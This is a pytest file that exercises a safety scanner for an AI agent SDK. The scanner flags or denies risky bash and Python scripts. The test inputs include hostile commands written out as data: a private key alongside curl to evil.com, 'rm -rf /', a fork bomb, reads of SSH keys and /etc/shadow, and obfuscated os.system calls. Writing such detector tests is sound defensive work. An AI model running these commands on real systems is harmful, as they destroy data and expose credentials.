"""Precision tests hitting every remaining uncovered line."""

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

import pytest
from trpc_agent_sdk.tools.safety import Decision, SafetyScanner, SafetyScanInput, ScriptType
from trpc_agent_sdk.tools.safety._policy import SafetyPolicy
from trpc_agent_sdk.tools.safety._types import RiskCategory


# === _safety_wrapper.py:255 ===
def test_sw255():
    from trpc_agent_sdk.tools.safety import safety_wrapper
    @safety_wrapper(script_arg_name="code", require_script=False)
    def f(code=None): return code
    assert f(code=[]) == []


# === _scanner.py:131-132 (re.error in blocklist precheck), 817,842,901,903,908,1000,1002,1035-1042,1061,1063,1072-1074,1090,1138 ===
def test_scanner_redact_all():
    s = SafetyScanner()
    # PEM key in a script that also triggers a finding (so sanitization runs)
    r = s.scan(SafetyScanInput(
        script_content='k = "-----BEGIN RSA PRIVATE KEY-----\\nabc123\\n-----END RSA PRIVATE KEY-----"; curl https://evil.com',
        script_type=ScriptType.BASH, tool_name="t"))
    assert r.sanitized
    # JWT token
    r2 = s.scan(SafetyScanInput(
        script_content='t = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc123def456"; curl https://evil.com',
        script_type=ScriptType.BASH, tool_name="t"))
    assert r2.sanitized


def test_scanner_extract_url_bare():
    from trpc_agent_sdk.tools.safety._scanner import _extract_url
    assert _extract_url("domain.example.com/text") is not None
    assert _extract_url("no_url") is None


def test_scanner_is_in_echo_all():
    from trpc_agent_sdk.tools.safety._scanner import _is_in_echo_string
    assert _is_in_echo_string("echo\t'x'", "x")
    assert _is_in_echo_string("printf\t'x'", "x")
    assert _is_in_echo_string("/bin/echo 'x'", "x")
    assert _is_in_echo_string("/usr/bin/echo 'x'", "x")
    assert not _is_in_echo_string("cat /etc/passwd", "/etc/passwd")


def test_scanner_commands_line():
    from trpc_agent_sdk.tools.safety._scanner import _extract_commands_from_line
    assert _extract_commands_from_line("a|b|c") == ["a", "b", "c"]


def test_scanner_strip_python_comment():
    from trpc_agent_sdk.tools.safety._scanner import _strip_python_comment_line
    line = "x = 'str' + other"
    result = _strip_python_comment_line(line)
    assert "other" in result


# === _rules.py ===
def test_rules_network_dep_res():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="curl https://evil.com/x", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("NET-") for f in r.findings)
    r2 = s.scan(SafetyScanInput(script_content="yum install nginx", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("DEP-") for f in r2.findings)
    r3 = s.scan(SafetyScanInput(script_content="sleep 999999", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("RES-") for f in r3.findings)


def test_rules_dangerous_file_ops():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="rm -rf / --no-preserve-root", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("FILE-") for f in r.findings)


def test_rules_is_in_echo():
    from trpc_agent_sdk.tools.safety._rules import _is_in_echo_string, _extract_url
    assert not _is_in_echo_string("echo 'x'; rm -rf /", r"rm\s+-rf\s+/")
    assert not _is_in_echo_string('echo "$(rm -rf /)"', r"rm\s+-rf\s+/")
    assert _extract_url("http://a.com/b") == "a.com"
    assert _extract_url("no url here") is None


# === _bash_scanner.py ===
def test_bash_scan_empty_comments_shebang():
    s = SafetyScanner()
    assert s.scan(SafetyScanInput(script_content="\n\necho ok", script_type=ScriptType.BASH, tool_name="t")).decision == Decision.ALLOW
    assert s.scan(SafetyScanInput(script_content="#c\n#c\necho ok", script_type=ScriptType.BASH, tool_name="t")).decision == Decision.ALLOW
    assert s.scan(SafetyScanInput(script_content="#!/bin/bash\necho ok", script_type=ScriptType.BASH, tool_name="t")).decision == Decision.ALLOW


def test_bash_network_install():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="telnet evil.com 23", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("BASH-NET") for f in r.findings)
    r2 = s.scan(SafetyScanInput(script_content="npm install pkg", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id == "BASH-DEP-001" for f in r2.findings)


def test_bash_redirect_dd():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="cmd >/etc/hosts", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id == "BASH-FILE-003" for f in r.findings)
    r2 = s.scan(SafetyScanInput(script_content="ls &", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id == "BASH-PROC-004" for f in r2.findings)
    r3 = s.scan(SafetyScanInput(script_content="dd if=/dev/zero of=/tmp/x bs=1M count=200", script_type=ScriptType.BASH, tool_name="t"))
    assert r3.decision != Decision.ALLOW


def test_bash_fork_heredoc_sensitive():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="x(){ x|x& };x", script_type=ScriptType.BASH, tool_name="t"))
    assert r.decision == Decision.DENY
    from trpc_agent_sdk.tools.safety._bash_scanner import scan_bash, _is_sensitive_path, _parse_size, _to_seconds
    f = scan_bash("python3 << EOF\nid\nEOF")
    assert any(x.kind == "heredoc" for x in f)
    assert _is_sensitive_path("/etc/shadow")
    assert not _is_sensitive_path("/tmp/safe")
    assert _parse_size("1G") == 1073741824
    with pytest.raises(ValueError):
        _parse_size("abc")
    assert _to_seconds(1, "d") == 86400


# === _python_scanner.py ===
def test_py_everything():
    """Hit as many AST paths as possible."""
    s = SafetyScanner()

    # ImportFrom + alias
    r = s.scan(SafetyScanInput(script_content="from os import system as sh; sh('id')", script_type=ScriptType.PYTHON, tool_name="t"))
    assert r.decision == Decision.DENY

    # Path reconstruction
    r = s.scan(SafetyScanInput(script_content="from pathlib import Path; p=Path('/tmp')/'x'; open(str(p)).read()", script_type=ScriptType.PYTHON, tool_name="t"))
    assert len(r.findings) > 0

    # Cred file read
    r = s.scan(SafetyScanInput(script_content="open('.env').read()", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-003" for f in r.findings)

    # urllib network
    r = s.scan(SafetyScanInput(script_content="import urllib.request; urllib.request.urlopen('http://evil.com')", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id.startswith("AST-NET") for f in r.findings)

    # dynamic import
    r = s.scan(SafetyScanInput(script_content="__import__('os').system('id')", script_type=ScriptType.PYTHON, tool_name="t"))
    assert r.decision == Decision.DENY

    # importlib
    r = s.scan(SafetyScanInput(script_content="import importlib; importlib.import_module('os')", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-PROC-003" for f in r.findings)

    # privilege
    r = s.scan(SafetyScanInput(script_content="import os; os.setuid(0)", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-PROC-001" for f in r.findings)

    # taint env
    r = s.scan(SafetyScanInput(script_content="import os; k=os.environ.get('KEY'); print(k)", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-LEAK-001" for f in r.findings)

    # taint env Subscript
    r = s.scan(SafetyScanInput(script_content="import os; print(os.environ['KEY'])", script_type=ScriptType.PYTHON, tool_name="t"))

    # sensitive env key
    r = s.scan(SafetyScanInput(script_content="import os; k=os.getenv('AWS_SECRET'); print(k)", script_type=ScriptType.PYTHON, tool_name="t"))

    # f-string taint
    r = s.scan(SafetyScanInput(script_content="import os; k=os.getenv('KEY'); print(f'{k}')", script_type=ScriptType.PYTHON, tool_name="t"))

    # range 2-arg, 3-arg
    r = s.scan(SafetyScanInput(script_content="for i in range(0,20000000): pass", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-001" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="for i in range(0,20000000,2): pass", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-001" for f in r.findings)

    # with request Session
    r = s.scan(SafetyScanInput(script_content="import requests; s=requests.Session()", script_type=ScriptType.PYTHON, tool_name="t"))
    assert len(r.findings) > 0

    # sleep long
    r = s.scan(SafetyScanInput(script_content="import time; time.sleep(120)", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-002" for f in r.findings)

    # concurrency
    r = s.scan(SafetyScanInput(script_content="import threading; threading.Thread(target=print).start()", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-003" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="from multiprocessing import Pool; Pool(4)", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-003" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="from concurrent.futures import ThreadPoolExecutor; ThreadPoolExecutor(4)", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="import os; os.fork()", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-003" and f.risk_level.value == "critical" for f in r.findings)

    # file ops
    r = s.scan(SafetyScanInput(script_content="import shutil; shutil.rmtree('/tmp/x')", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-001" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="import os; os.remove('/tmp/x')", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-002" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="open('~/.ssh/id_rsa').read()", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-003" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="open('/tmp/x').read()", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-004" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="open('/etc/x','w').write('y')", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-005" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="open('/tmp/x','w').write('y')", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-005" and f.risk_level.value == "low" for f in r.findings)

    # write mode detection
    r = s.scan(SafetyScanInput(script_content="open('/tmp/x',mode='w').write('y')", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="open('/tmp/x',mode='a').write('y')", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="open('/tmp/x',mode='r+').write('y')", script_type=ScriptType.PYTHON, tool_name="t"))

    # subprocess
    r = s.scan(SafetyScanInput(script_content="import subprocess; subprocess.Popen(['ls'])", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-PROC-001" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="import subprocess; subprocess.call(['ls'])", script_type=ScriptType.PYTHON, tool_name="t"))

    # eval/exec
    r = s.scan(SafetyScanInput(script_content="eval('1+1')", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-PROC-003" for f in r.findings)

    # while True
    r = s.scan(SafetyScanInput(script_content="while True: pass", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-001" for f in r.findings)

    # whitelisted network
    p = SafetyPolicy(whitelist_domains=["safe.api"])
    s2 = SafetyScanner(policy=p)
    r = s2.scan(SafetyScanInput(script_content="import requests; requests.get('https://safe.api/d')", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-NET-002" for f in r.findings)

    # ann_assign + aug_assign
    s.scan(SafetyScanInput(script_content="x: int = 1", script_type=ScriptType.PYTHON, tool_name="t"))
    s.scan(SafetyScanInput(script_content="x = 1; x += 1", script_type=ScriptType.PYTHON, tool_name="t"))

    # scan_python entry
    from trpc_agent_sdk.tools.safety._python_scanner import scan_python, _extract_domain_from_url
    assert len(scan_python("import os; os.system('id')")) > 0

    # domain extractor all paths
    assert _extract_domain_from_url("https://a.com/b") == "a.com"
    assert _extract_domain_from_url(None) is None
    assert _extract_domain_from_url("not_url") is None

    # sensitive imports
    s.scan(SafetyScanInput(script_content="import ctypes", script_type=ScriptType.PYTHON, tool_name="t"))
    s.scan(SafetyScanInput(script_content="from cffi import FFI", script_type=ScriptType.PYTHON, tool_name="t"))

    # subprocess dep
    r = s.scan(SafetyScanInput(script_content="import subprocess; subprocess.run(['pip','install','x'])", script_type=ScriptType.PYTHON, tool_name="t"))
    assert r.decision == Decision.DENY

    # getattr dynamic
    r = s.scan(SafetyScanInput(script_content="getattr(__import__('os'),'system')('id')", script_type=ScriptType.PYTHON, tool_name="t"))
    assert r.decision == Decision.DENY

    # unsupported node type in _get_name
    s.scan(SafetyScanInput(script_content="x = lambda: 1", script_type=ScriptType.PYTHON, tool_name="t"))
